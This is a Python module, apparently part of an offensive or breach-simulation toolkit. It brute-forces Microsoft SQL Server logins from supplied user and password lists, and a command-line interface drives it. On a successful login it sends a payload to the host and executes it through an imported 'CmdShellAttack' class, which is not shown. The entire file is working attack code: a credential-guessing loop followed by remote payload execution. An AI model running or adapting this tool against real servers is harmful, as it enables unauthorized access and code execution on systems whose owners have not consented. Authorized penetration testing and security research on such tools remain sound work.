""" Main code for the bruteforce module """

import argparse
import logging

import pymssql

import payload_handling
import consts


# The attacks list that holds the attack kind classes, this can be replaced easily and expanded
attacks_list = [payload_handling.CmdShellAttack]


def mssql_brute_force(host, port, users, passwords, payload, version):

    """
    Main function of the mssql brute force, takes arguments

        Args:
            host (str): Host ip address
            port (str): Tcp port that the host listens to
            payload (str): Local path to the payload
            users (list): a list of users to bruteforce with
            passwords (list): a list of passwords to bruteforce with
            version (string): MSSQL version on host

        Return:
            True or False depends on process success
    """

    if brute_force_begin(host, port, users, passwords, payload):
        logging.debug("Bruteforce was a success on host: {0}".format(host))
        return True
    else:
        logging.error("Bruteforce process failed on host: {0}".format(host))
        return False


def handle_payload(cursor, payload):

    """
        Handles the process of payload sending and execution, prepares the attack and details.

        Args:
            cursor (pymssql.conn.cursor obj): A cursor of a connected pymssql.connect obj to user for commands.
            payload (string): Paylode path

        Return:
            True or False depends on process success
    """

    chosen_attack = attacks_list[0](payload, cursor)

    if chosen_attack.send_payload():
        logging.debug('Payload: {0} has been successfully sent to host'.format(payload))
        if chosen_attack.execute_payload():
            logging.debug('Payload: {0} has been successfully executed on host'.format(payload))
            return True
        else:
            logging.error("Payload: {0} couldn't be executed".format(payload))
    else:
        logging.error("Payload: {0} couldn't be sent to host".format(payload))

    return False


def brute_force_begin(host, port, users_list, passwords_list, payload):
    """
        Starts the brute force connection attempts and if needed then init the payload process.
        Main loop starts here.

        Args:
            host (str): Host ip address
            port (str): Tcp port that the host listens to
            payload (str): Local path to the payload
            users_list (list): a list of users to bruteforce with
            passwords_list (list): a list of passwords to bruteforce with

        Return:
            True or False depends if the whole bruteforce and attack process was completed successfully or not
        """
    # Main loop
    # Iterates on users list
    for user in users_list:
        # Iterates on passwords list
        for password in passwords_list:
            try:

                # Core steps
                # Trying to connect
                conn = pymssql.connect(host, user, password, port=port)
                logging.info('Successfully connected to host: {0}, '
                             'using user: {1}, password: {2}'.format(host, user, password))
                cursor = conn.cursor()

                # Handles the payload and return True or False
                if handle_payload(cursor, payload):
                    logging.debug("Successfully sent and executed payload: {0} on host: {1}".format(payload, host))
                    return True
                else:
                    logging.warning("user: {0} and password: {1}, "
                                    "was able to connect to host: {2} but couldn't handle payload: {3}"
                                    .format(user, password, host, payload))
            except pymssql.OperationalError:
                # Combo didn't work, hopping to the next one
                pass

    logging.warning('No user/password combo was able to connect to host: {0}:{1}, '
                    'aborting brute force'.format(host, port))
    return False


if __name__ == '__main__':
    """ Main function of the mssql brute force, takes arguments

        Args:
            host (str): Host ip address
            port (str): Tcp port that the host listens to
            payload (str): Local path to the payload
            users (list): a list of users to bruteforce with
            passwords (list): a list of passwords to bruteforce with
            version (string): MSSQL version on host
    """

    parser = argparse.ArgumentParser(description=__doc__)

    parser.add_argument('-H', '--host',
                        help='hostname or IP address of the SQL Server to query for information')
    parser.add_argument('-p', '--port', default=consts.SQL_DEFAULT_TCP_PORT, required=False,
                        help='SQL tcp port')
    parser.add_argument('-v', '--version', default=None, required=True,
                        help='SQL server version')
    parser.add_argument('-u', '--users', nargs='+', required=True,
                        help='A list of user to brute force')
    parser.add_argument('-pass', '--passwords', nargs='+', required=True,
                        help='A list of passwords to brute force')
    parser.add_argument('-f', '--payload', required=True,
                        help='A path to the payload (file or dir)')

    arguments = parser.parse_args()

    mssql_brute_force(arguments.host, arguments.port, arguments.users, arguments.passwords,
                      arguments.payload, arguments.version)


